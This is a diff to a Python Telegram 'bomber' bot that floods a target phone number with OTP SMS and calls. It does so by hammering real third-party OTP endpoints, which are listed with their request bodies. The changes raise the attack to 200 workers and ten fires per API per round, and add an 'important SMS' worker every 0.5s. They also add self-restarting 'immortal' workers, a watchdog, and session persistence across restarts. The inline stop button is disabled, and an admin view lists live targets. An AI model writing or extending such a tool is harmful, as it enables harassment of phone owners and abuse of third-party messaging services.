@@ -17,6 +17,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 import json
 from collections import defaultdict
+import sys
 
 # ============================================================
 # CONFIG — Bot Token + Speed Settings
@@ -40,16 +41,17 @@ if API_TOKEN and not os.path.exists("config_token.py"):
     except:
         pass
 
-MAX_WORKERS = 25  # Optimal — 25 concurrent threads
-SMS_MAX_WORKERS = 40  # SMS mode gets 60 workers (stable for 5+ concurrent users)
-DELAY_BETWEEN_ROUNDS = 0.5  # 500ms between rounds
-SMS_DELAY_BETWEEN_ROUNDS = 0.15  # 150ms between SMS rounds — faster!
+MAX_WORKERS = 50  # Ultra Power — 50 concurrent threads
+SMS_MAX_WORKERS = 200  # ULTRA POWER — 200 SMS workers for 10 req/sec/API
+DELAY_BETWEEN_ROUNDS = 0.2  # 200ms between rounds (Ultra Power)
+SMS_DELAY_BETWEEN_ROUNDS = 0.05  # 50ms between SMS rounds — ULTRA FAST!
 SMS_DOUBLE_FIRE = True  # Double fire — har API ek round mein 2 baar fire!
 SMS_AUTO_RETRY = True  # Retry failed SMS APIs immediately
-MAX_CONCURRENT_SESSIONS = 5  # Max 5 users can bomb simultaneously (prevents crash)
+MAX_CONCURRENT_SESSIONS = 3  # Max 3 users (Ultra Power needs more resources per user)
 
-IMPORTANT_CALL_INTERVAL = 5  # Important call APIs fire every 5 seconds
+IMPORTANT_CALL_INTERVAL = 3  # Important call APIs fire every 3 seconds
 IMPORTANT_5S_INTERVAL = 5  # 5-second important APIs fire every 5 seconds
+IMPORTANT_SMS_INTERVAL = 0.5  # Important SMS APIs — 6 req/sec total (3 APIs × 2 times/sec)
 
 # ============================================================
 # ADMIN CONFIG
@@ -802,6 +804,21 @@ IMPORTANT_5S_APIS = [
 ]
 
 # ============================================================
+# IMPORTANT SMS APIs — Fire every 0.5s (6 req/sec) for non-stop barrage
+# ============================================================
+IMPORTANT_SMS_APIS = [
+    ApiConfig("CountryDelight_Imp", "https://api.countrydelight.in/api/auth/new_request_otp", "POST",
+              {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36"},
+              '{"new_user":true,"mobile_no":"{phone}"}', "sms"),
+    ApiConfig("DocTime_Imp", "https://admin.doctime.com.bd/api/otp/send", "POST",
+              {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36"},
+              '{"contact":"{phone}"}', "sms"),
+    ApiConfig("PenPencil_Imp", "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "POST",
+              {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36"},
+              '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}', "sms"),
+]
+
+# ============================================================
 # WORKER — Ultra Fast Multi-Threaded Continuous Bomber
 # ============================================================
 class UltraBomber:
@@ -812,8 +829,8 @@ class UltraBomber:
         self.sms_executor = ThreadPoolExecutor(max_workers=SMS_MAX_WORKERS)  # 40 workers for SMS
         self.http_session = requests.Session()  # Reusable session for connection pooling
         # Set default timeouts on the session
-        self.http_session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=30, pool_maxsize=100, max_retries=0))
-        self.http_session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=30, pool_maxsize=100, max_retries=0))
+        self.http_session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=200, max_retries=0))
+        self.http_session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=200, max_retries=0))
 
     def _fire_api(self, api, phone):
         """Fire a single API and return result"""
@@ -830,8 +847,8 @@ class UltraBomber:
         """Fire all APIs in parallel for one round"""
         executor = self.sms_executor if is_sms else self.executor
         
-        # SMS mode: DOUBLE FIRE — each API fires twice!
-        fire_count = 2 if (is_sms and SMS_DOUBLE_FIRE) else 1
+        # SMS mode: ULTRA POWER — each API fires 10 times per round!
+        fire_count = 10 if (is_sms and SMS_DOUBLE_FIRE) else 1
         
         futures = []
         for api in apis:
@@ -855,7 +872,7 @@ class UltraBomber:
         if is_sms and SMS_AUTO_RETRY and failed_apis:
             retry_futures = []
             for api in apis:
-                if api.name in failed_apis[:30]:  # Retry up to 30 failed APIs
+                if api.name in failed_apis[:50]:  # Retry up to 50 failed APIs
                     retry_futures.append(executor.submit(self._fire_api, api, phone))
             for f in as_completed(retry_futures):
                 name, status, size, err = f.result()
@@ -867,86 +884,101 @@ class UltraBomber:
         return ok_count, fail_count
 
     def _worker(self, chat_id, stop_event):
-        """Main worker loop — runs until stopped"""
-        with self.lock:
-            info = self.sessions.get(chat_id)
-            if not info:
-                return
-            phone = info["phone"]
-            mode = info["mode"]
-            stats = info["stats"]
-
-        # Select APIs based on mode
-        if mode == "call":
-            apis = CALL_APIS
-        elif mode == "whatsapp":
-            apis = WHATSAPP_APIS
-        elif mode == "sms":
-            apis = SMS_APIS
-        else:
-            apis = ALL_APIS
-
-        round_num = 0
-        is_sms_mode = (mode == "sms")
-        round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS
-        
+        """Main worker loop — runs until stopped, with auto-recovery"""
         while not stop_event.is_set():
-            round_num += 1
             try:
-                ok, fail = self._run_round(phone, apis, stats, is_sms=is_sms_mode)
                 with self.lock:
-                    if chat_id in self.sessions:
-                        self.sessions[chat_id]["stats"]["ok"] += ok
-                        self.sessions[chat_id]["stats"]["fail"] += fail
-                        self.sessions[chat_id]["stats"]["rounds"] += 1
-                        self.sessions[chat_id]["stats"]["total"] += ok + fail
+                    info = self.sessions.get(chat_id)
+                    if not info:
+                        return
+                    phone = info["phone"]
+                    mode = info["mode"]
+                    stats = info["stats"]
 
-                # SMS mode: report every 10 rounds, Call/Mix every 5
-                report_interval = 10 if is_sms_mode else 5
-                if round_num % report_interval == 0:
-                    with self.lock:
-                        s = self.sessions.get(chat_id, {}).get("stats", {})
-                        if s:
-                            elapsed = (datetime.now() - s["start_time"]).total_seconds()
-                            s["elapsed"] = str(datetime.now() - s["start_time"]).split('.')[0]
+                # Select APIs based on mode
+                if mode == "call":
+                    apis = CALL_APIS
+                elif mode == "whatsapp":
+                    apis = WHATSAPP_APIS
+                elif mode == "sms":
+                    apis = SMS_APIS
+                else:
+                    apis = ALL_APIS
+
+                round_num = 0
+                is_sms_mode = (mode == "sms")
+                round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS
+
+                while not stop_event.is_set():
+                    round_num += 1
                     try:
-                        total = s.get('total', 0)
-                        ok = s.get('ok', 0)
-                        fail = s.get('fail', 0)
-                        pct = (ok / max(total, 1)) * 100
-                        bar_len = 30
-                        filled = int(bar_len * pct / 100)
-                        bar = "█" * filled + "░" * (bar_len - filled)
-                        bot.send_message(chat_id,
-                            f"💣 *BOMBING ACTIVE* 💣\n"
-                            f"━━━━━━━━━━━━━━━━━━━━━\n"
-                            f"💣 Target: `{phone}`\n"
-                            f"✅ Hits: {ok}/{total}\n"
-                            f"📊 Progress: [{bar}] {pct:.1f}%\n"
-                            f"⏱️ Time Elapsed: {s.get('elapsed', '0s')}",
-                            parse_mode="Markdown")
+                        ok, fail = self._run_round(phone, apis, stats, is_sms=is_sms_mode)
+                        with self.lock:
+                            if chat_id not in self.sessions:
+                                return
+                            self.sessions[chat_id]["stats"]["ok"] += ok
+                            self.sessions[chat_id]["stats"]["fail"] += fail
+                            self.sessions[chat_id]["stats"]["rounds"] += 1
+                            self.sessions[chat_id]["stats"]["total"] += ok + fail
+
+                        # SMS mode: report every 10 rounds, Call/Mix every 5
+                        report_interval = 10 if is_sms_mode else 5
+                        if round_num % report_interval == 0:
+                            with self.lock:
+                                if chat_id not in self.sessions:
+                                    return
+                                s = self.sessions.get(chat_id, {}).get("stats", {})
+                                if s:
+                                    elapsed = (datetime.now() - s["start_time"]).total_seconds()
+                                    s["elapsed"] = str(datetime.now() - s["start_time"]).split('.')[0]
+                            try:
+                                total = s.get('total', 0)
+                                ok = s.get('ok', 0)
+                                fail = s.get('fail', 0)
+                                pct = (ok / max(total, 1)) * 100
+                                bar_len = 30
+                                filled = int(bar_len * pct / 100)
+                                bar = "█" * filled + "░" * (bar_len - filled)
+                                bot.send_message(chat_id,
+                                    f"💣 *BOMBING ACTIVE* 💣\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"💣 Target: `{phone}`\n"
+                                    f"✅ Hits: {ok}/{total}\n"
+                                    f"📊 Progress: [{bar}] {pct:.1f}%\n"
+                                    f"⏱️ Time Elapsed: {s.get('elapsed', '0s')}",
+                                    parse_mode="Markdown")
+                            except:
+                                pass
+                    except Exception as e:
+                        try:
+                            bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}")
+                        except:
+                            pass
+                    try:
+                        time.sleep(round_delay)
                     except:
-                        pass
-            except Exception as e:
+                        time.sleep(1)
+            except:
+                # Outer recovery - if entire worker crashes, restart after 3s
                 try:
-                    bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}")
+                    time.sleep(3)
                 except:
                     pass
-            time.sleep(round_delay)
 
     def _important_worker(self, chat_id, stop_event):
-        """Important call APIs — fire every 3 seconds independently"""
-        with self.lock:
-            info = self.sessions.get(chat_id)
-            if not info:
-                return
-            phone = info["phone"]
-
+        """Important call APIs — fire every 3 seconds — immortal worker"""
         while not stop_event.is_set():
             try:
+                with self.lock:
+                    info = self.sessions.get(chat_id)
+                    if not info:
+                        time.sleep(3)
+                        continue
+                    phone = info["phone"]
+
                 futures = []
                 for api in IMPORTANT_CALL_APIS:
-                    futures.append(self.executor.submit(self._fire_api, api, phone))
+                    futures.append(self.sms_executor.submit(self._fire_api, api, phone))
 
                 ok_count = 0
                 fail_count = 0
@@ -962,20 +994,24 @@ class UltraBomber:
                         self.sessions[chat_id]["stats"]["ok"] += ok_count
                         self.sessions[chat_id]["stats"]["fail"] += fail_count
                         self.sessions[chat_id]["stats"]["total"] += ok_count + fail_count
+                time.sleep(IMPORTANT_CALL_INTERVAL)
             except:
-                pass
-            time.sleep(IMPORTANT_CALL_INTERVAL)
+                try:
+                    time.sleep(IMPORTANT_CALL_INTERVAL)
+                except:
+                    pass
 
     def _important_five_second_worker(self, chat_id, stop_event):
-        """5-second important APIs — fire exactly once every 5 seconds"""
-        with self.lock:
-            info = self.sessions.get(chat_id)
-            if not info:
-                return
-            phone = info["phone"]
-
+        """5-second important APIs — immortal worker"""
         while not stop_event.is_set():
             try:
+                with self.lock:
+                    info = self.sessions.get(chat_id)
+                    if not info:
+                        time.sleep(5)
+                        continue
+                    phone = info["phone"]
+
                 futures = []
                 for api in IMPORTANT_5S_APIS:
                     futures.append(self.executor.submit(self._fire_api, api, phone))
@@ -989,9 +1025,43 @@ class UltraBomber:
                             else:
                                 self.sessions[chat_id]["stats"]["fail"] += 1
                             self.sessions[chat_id]["stats"]["total"] += 1
+                time.sleep(IMPORTANT_5S_INTERVAL)
             except:
-                pass
-            time.sleep(IMPORTANT_5S_INTERVAL)
+                try:
+                    time.sleep(IMPORTANT_5S_INTERVAL)
+                except:
+                    pass
+
+    def _important_sms_worker(self, chat_id, stop_event):
+        """Important SMS APIs — fire every 0.5s — immortal worker (40 pool)"""
+        while not stop_event.is_set():
+            try:
+                with self.lock:
+                    info = self.sessions.get(chat_id)
+                    if not info:
+                        time.sleep(1)
+                        continue
+                    phone = info["phone"]
+
+                futures = []
+                for api in IMPORTANT_SMS_APIS:
+                    futures.append(self.sms_executor.submit(self._fire_api, api, phone))
+
+                for f in as_completed(futures):
+                    name, status, size, err = f.result()
+                    with self.lock:
+                        if chat_id in self.sessions:
+                            if 200 <= status < 400 and size > 0:
+                                self.sessions[chat_id]["stats"]["ok"] += 1
+                            else:
+                                self.sessions[chat_id]["stats"]["fail"] += 1
+                            self.sessions[chat_id]["stats"]["total"] += 1
+                time.sleep(IMPORTANT_SMS_INTERVAL)
+            except:
+                try:
+                    time.sleep(IMPORTANT_SMS_INTERVAL)
+                except:
+                    pass
 
     def start(self, chat_id, phone, mode, username=None):
         with self.lock:
@@ -1015,8 +1085,8 @@ class UltraBomber:
             stats = {"ok": 0, "fail": 0, "rounds": 0, "total": 0, "start_time": datetime.now(), "elapsed": "0s"}
             self.sessions[chat_id] = {
                 "phone": phone, "mode": mode, "stop_event": stop_event,
-                "stats": stats, "thread": None, "imp_thread": None, "imp5s_thread": None,
-                "user_id": chat_id, "username": username
+                "stats": stats, "thread": None, "imp_thread": None, "imp5s_thread": None, "imp_sms_thread": None,
+                "user_id": chat_id, "username": username, "active_msg_id": None,
             }
             thread = threading.Thread(target=self._worker, args=(chat_id, stop_event), daemon=True)
             thread.start()
@@ -1030,12 +1100,16 @@ class UltraBomber:
             imp5s_thread = threading.Thread(target=self._important_five_second_worker, args=(chat_id, stop_event), daemon=True)
             imp5s_thread.start()
             self.sessions[chat_id]["imp5s_thread"] = imp5s_thread
+            # Spawn important SMS thread for ALL modes (fires every 0.5s — 6 req/sec)
+            imp_sms_thread = threading.Thread(target=self._important_sms_worker, args=(chat_id, stop_event), daemon=True)
+            imp_sms_thread.start()
+            self.sessions[chat_id]["imp_sms_thread"] = imp_sms_thread
             
             # Send initial bombing active message with stop button
             try:
                 stop_markup = types.InlineKeyboardMarkup()
                 stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
-                bot.send_message(chat_id,
+                msg = bot.send_message(chat_id,
                     f"💣 *BOMBING ACTIVE* 💣\n"
                     f"━━━━━━━━━━━━━━━━━━━━━\n"
                     f"💣 Target: `{phone}`\n"
@@ -1046,15 +1120,18 @@ class UltraBomber:
                     f"━━━━━━━━━━━━━━━━━━━━━\n"
                     f"⚡ Full attack initiated...",
                     parse_mode="Markdown", reply_markup=stop_markup)
+                self.sessions[chat_id]["active_msg_id"] = msg.message_id
             except:
                 pass
             
+            print(f"[SESSION] START {chat_id} | {phone} | {mode}")
             return True, f"🔥 *{mode.upper()} started for* `{phone}`"
 
     def stop(self, chat_id):
         thread_to_join = None
         imp_thread_to_join = None
         imp5s_to_join = None
+        imp_sms_to_join = None
         with self.lock:
             if chat_id not in self.sessions:
                 return False, "❌ Koi active session nahi hai."
@@ -1062,6 +1139,7 @@ class UltraBomber:
             thread_to_join = self.sessions[chat_id].get("thread")
             imp_thread_to_join = self.sessions[chat_id].get("imp_thread")
             imp5s_to_join = self.sessions[chat_id].get("imp5s_thread")
+            imp_sms_to_join = self.sessions[chat_id].get("imp_sms_thread")
             elapsed = datetime.now() - self.sessions[chat_id]["stats"]["start_time"]
             s = self.sessions[chat_id]["stats"]
             admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
@@ -1071,9 +1149,10 @@ class UltraBomber:
             bar_len = 30
             filled = int(bar_len * pct / 100)
             bar = "█" * filled + "░" * (bar_len - filled)
+            print(f"[SESSION] STOP {chat_id} | total={total} ok={ok}")
             del self.sessions[chat_id]
         # Wait for threads outside lock to prevent deadlock
-        for t in [thread_to_join, imp_thread_to_join, imp5s_to_join]:
+        for t in [thread_to_join, imp_thread_to_join, imp5s_to_join, imp_sms_to_join]:
             if t and t.is_alive():
                 t.join(timeout=3)
         return True, (f"💥 *BOMBING COMPLETE* 💥\n"
@@ -1107,10 +1186,140 @@ class UltraBomber:
                 s = self.sessions[chat_id]["stats"]
                 admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
                 self.sessions[chat_id]["stop_event"].set()
+            count = len(ids)
             self.sessions.clear()
-            return len(ids)
+            print(f"[SESSION] STOP_ALL — {count} sessions killed")
+            return count
 
 bomber = UltraBomber()
+
+# ============================================================
+# SESSION PERSISTENCE — Bombing sessions survive bot restarts
+# ============================================================
+SESSION_BACKUP_FILE = "active_sessions_backup.json"
+
+def save_active_sessions():
+    """Save all active sessions to disk so they can be restored after restart"""
+    with bomber.lock:
+        sessions_data = {}
+        for chat_id, s in bomber.sessions.items():
+            if not s["stop_event"].is_set():
+                sessions_data[str(chat_id)] = {
+                    "phone": s["phone"],
+                    "mode": s["mode"],
+                    "username": s.get("username", "Unknown"),
+                    "user_id": s.get("user_id", chat_id),
+                    "stats": {
+                        "ok": s["stats"]["ok"],
+                        "fail": s["stats"]["fail"],
+                        "rounds": s["stats"]["rounds"],
+                        "total": s["stats"]["total"],
+                        "start_time": s["stats"]["start_time"].isoformat()
+                    }
+                }
+        if sessions_data:
+            with open(SESSION_BACKUP_FILE, "w") as f:
+                json.dump(sessions_data, f)
+            print(f"💾 Saved {len(sessions_data)} active sessions to resume later.")
+        else:
+            # Delete backup if no active sessions
+            try:
+                os.remove(SESSION_BACKUP_FILE)
+            except:
+                pass
+
+def restore_active_sessions():
+    """Restore active sessions from backup after bot restart — runs in background thread"""
+    if not os.path.exists(SESSION_BACKUP_FILE):
+        return 0
+    try:
+        with open(SESSION_BACKUP_FILE) as f:
+            sessions_data = json.load(f)
+        # Remove backup so it doesn't restore twice
+        os.remove(SESSION_BACKUP_FILE)
+    except:
+        return 0
+    
+    def _do_restore():
+        restored = 0
+        for chat_id_str, data in sessions_data.items():
+            chat_id = int(chat_id_str)
+            phone = data["phone"]
+            mode = data["mode"]
+            username = data.get("username", "Unknown")
+            
+            # Wait a moment for polling to be fully ready
+            time.sleep(2)
+            
+            # Auto-restart session
+            success, msg = bomber.start(chat_id, phone, mode, username=username)
+            if success:
+                restored += 1
+                # Notify user that their session was resumed
+                try:
+                    bot.send_message(chat_id,
+                        f"🔄 *Session Resumed!* 🔄\n\n"
+                        f"Bot restart ho gaya tha, lekin aapka session dubara shuru kar diya!\n"
+                        f"📱 Target: `{phone}`\n"
+                        f"🎯 Mode: *{mode.upper()}*\n\n"
+                        f"💣 Bombing continue ho rahi hai — koi action nahi chahiye!",
+                        parse_mode="Markdown")
+                except:
+                    pass
+                print(f"🔄 Resumed session: {chat_id} | {mode} | {phone}")
+            else:
+                print(f"⚠️ Could not resume session {chat_id}: {msg[:60]}")
+        
+        print(f"🔄 Restored {restored}/{len(sessions_data)} sessions from backup!")
+    
+    # Run restore in background thread so polling starts immediately
+    thread = threading.Thread(target=_do_restore, daemon=True)
+    thread.start()
+    return len(sessions_data)
+
+
+# ============================================================
+# SESSION WATCHDOG — Auto-recover if any worker dies
+# ============================================================
+def session_watchdog():
+    """Monitor thread that checks session health every 15 seconds — stable sessions only"""
+    import time as _t
+    _t.sleep(15)  # Initial delay — let sessions stabilize first
+    while True:
+        try:
+            _t.sleep(15)
+            with bomber.lock:
+                dead = []
+                ok = 0
+                for cid, s in list(bomber.sessions.items()):
+                    if s["stop_event"].is_set():
+                        continue
+                    w = s.get("thread")
+                    if w and not w.is_alive():
+                        dead.append(cid)
+                    else:
+                        ok += 1
+            if dead:
+                print(f"🔍 Watchdog: {ok} OK, {len(dead)} dead sessions")
+                for cid in dead:
+                    with bomber.lock:
+                        if cid not in bomber.sessions:
+                            continue
+                        s = bomber.sessions[cid]
+                        ph, md, un = s["phone"], s["mode"], s.get("username", "?")
+                    try:
+                        bot.send_message(cid, "🔄 *Auto-Restarting...* 🔄", parse_mode="Markdown")
+                    except:
+                        pass
+                    bomber.stop(cid)
+                    bomber.start(cid, ph, md, username=un)
+                    print(f"✅ Restored session {cid}")
+        except:
+            _t.sleep(3)
+
+# Start watchdog
+watchdog_thread = threading.Thread(target=session_watchdog, daemon=True)
+watchdog_thread.start()
 
 # ============================================================
 # CHANNEL CHECK — Force users to join before using bomber
@@ -1296,6 +1505,10 @@ def btn_stop(message):
         bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
         return
     success, msg = bomber.stop(message.chat.id)
+    # Clear cached phone so new mode asks for fresh number
+    uid = str(message.chat.id)
+    if uid in user_data.users and "phone" in user_data.users[uid]:
+        del user_data.users[uid]["phone"]
     bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(message.chat.id))
 
 @bot.message_handler(func=lambda m: m.text in ["🔥 MIX", "💥 Bulk MIX", "📞 CALL"])
@@ -1581,11 +1794,20 @@ def btn_admin_panel(message):
         types.InlineKeyboardButton("❌ Cancel Sub", callback_data="admin_cancelsub"),
         types.InlineKeyboardButton("🔑 Gen Key", callback_data="admin_genkey"),
         types.InlineKeyboardButton("🔐 View Keys", callback_data="admin_viewkeys"),
+        types.InlineKeyboardButton("🔬 API Test", callback_data="admin_apitest"),
         types.InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"),
         types.InlineKeyboardButton("❌ Close", callback_data="admin_close"),
     )
     subs_stats = admin_db.get_subscription_stats()
     admin_list = admin_db.get_admins()
+    
+    # Get active bombing sessions
+    active_sessions = {}
+    with bomber.lock:
+        for cid, s in bomber.sessions.items():
+            if not s["stop_event"].is_set():
+                active_sessions[str(cid)] = s
+    
     msg = (
         "⚙️ *Admin Panel*\n\n"
         f"👥 Total Users: {admin_db.get_user_count()}\n"
@@ -1596,9 +1818,24 @@ def btn_admin_panel(message):
         f"    └ VIP: {subs_stats['plans']['vip']}\n"
         f"👑 Admins: {len(admin_list) + len(ADMIN_IDS)} (Super: {len(ADMIN_IDS)} + Custom: {len(admin_list)})\n"
         f"🚫 Banned: {admin_db.get_banned_count()}\n"
-        f"💣 Total Bombs: {admin_db.get_total_bombs()}\n\n"
-        "Chooze karein:"
+        f"💣 Total Bombs: {admin_db.get_total_bombs()}\n"
     )
+    
+    if active_sessions:
+        msg += f"\n🔥 *Live: {len(active_sessions)} active*\n"
+        for uid, s in sorted(active_sessions.items(), key=lambda x: x[1]["stats"]["start_time"]):
+            phone = s.get("phone", "?")
+            mode = s.get("mode", "?").upper()
+            ok = s["stats"]["ok"]
+            total = s["stats"]["total"]
+            pct = (ok / max(total, 1)) * 100
+            elapsed = str(datetime.now() - s["stats"]["start_time"]).split('.')[0]
+            ico = "📞" if mode == "CALL" else "💬" if mode == "SMS" else "🔀"
+            msg += f"  {ico} `{uid}` 📱{phone} 🎯{mode} 💣{ok}/{total} ⏱{elapsed}\n"
+    else:
+        msg += "\n⏸️ *No active bombing*\n"
+    
+    msg += "\nChooze karein:"
     bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=markup)
 
 # ====== GENERATE KEY CALLBACKS ======
@@ -1651,13 +1888,8 @@ def goto_callback(call):
 # ====== STOP BOMBING CALLBACK ======
 @bot.callback_query_handler(func=lambda c: c.data == "stop_bombing")
 def stop_bombing_callback(call):
-    chat_id = call.message.chat.id
-    msg_id = call.message.message_id
-    if chat_id in bomber.sessions:
-        success, msg = bomber.stop(chat_id)
-        bot.edit_message_text(f"🛑 *Stopped!* ✅\n\n{msg}", chat_id, msg_id, parse_mode="Markdown")
-    else:
-        bot.answer_callback_query(call.id, "❌ No active session!", show_alert=True)
+    """Inline stop button disabled — sirf keyboard '🛑 Stop' se stop karein"""
+    bot.answer_callback_query(call.id, "🛑 Keyboard ka '🛑 Stop' button dabayein!", show_alert=True)
     bot.answer_callback_query(call.id)
 
 
@@ -2323,6 +2555,10 @@ if __name__ == "__main__":
     print(f"⚡ SMS Delay: {SMS_DELAY_BETWEEN_ROUNDS}s — NON STOP!")
     print(f"✅ Bot is running! Press Ctrl+C to stop.")
     print(f"👑 Admin ID: {ADMIN_IDS[0]} — Admin panel active!")
+    
+    # Restore any saved sessions from before restart
+    restored = restore_active_sessions()
+    
     if not API_TOKEN or len(API_TOKEN) < 10:
         print("❌ ERROR: No valid BOT_TOKEN found!")
         print("   Set BOT_TOKEN environment variable or create config_token.py")
@@ -2337,6 +2573,8 @@ if __name__ == "__main__":
                 print("🔄 Restarting polling in 5 seconds...")
                 time.sleep(5)
     except KeyboardInterrupt:
-        print("\n🛑 Stopping all sessions...")
+        print("\n🛑 Saving active sessions before shutdown...")
+        save_active_sessions()
+        print("🛑 Stopping all sessions...")
         stopped = bomber.stop_all()
         print(f"✅ Stopped {stopped} sessions. Bye!")
